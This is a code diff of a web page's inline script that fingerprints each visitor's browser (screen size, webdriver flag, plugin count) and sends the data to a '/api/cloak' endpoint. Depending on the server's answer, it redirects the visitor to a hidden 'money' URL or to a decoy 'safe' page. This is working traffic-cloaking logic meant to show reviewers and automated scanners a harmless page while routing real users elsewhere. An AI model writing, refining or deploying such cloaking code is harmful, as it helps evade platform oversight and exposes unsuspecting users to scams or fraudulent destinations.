@@ -9,24 +9,19 @@ body { margin: 0; background: #0d0010; display: flex; align-items: center; justi
 </style>
 <script>
 (function() {
-  var safe = 'https://www.entermytvcode.com/peacock-tv';
   var xhr = new XMLHttpRequest();
-  xhr.open('POST', '/api/cloakify', true);
+  xhr.open('POST', '/api/cloak', true);
   xhr.setRequestHeader('Content-Type', 'application/json');
-  xhr.timeout = 5000;
+  xhr.timeout = 7000;
   xhr.ontimeout = xhr.onerror = function() {
-    window.location.href = safe;
+    window.location.href = '/safe';
   };
   xhr.onload = function() {
     try {
       var r = JSON.parse(xhr.responseText);
-      if (r.decision === 'allow' && r.money_url) {
-        window.location.href = r.money_url;
-      } else {
-        window.location.href = safe;
-      }
+      window.location.href = r.url || '/safe';
     } catch(e) {
-      window.location.href = safe;
+      window.location.href = '/safe';
     }
   };
   xhr.send(JSON.stringify({
@@ -35,8 +30,7 @@ body { margin: 0; background: #0d0010; display: flex; align-items: center; justi
     sw: screen.width,
     sh: screen.height,
     wd: navigator.webdriver || false,
-    pl: navigator.plugins ? navigator.plugins.length : 0,
-    mode: 'redirect'
+    pl: navigator.plugins ? navigator.plugins.length : 0
   }));
 })();
 </script>
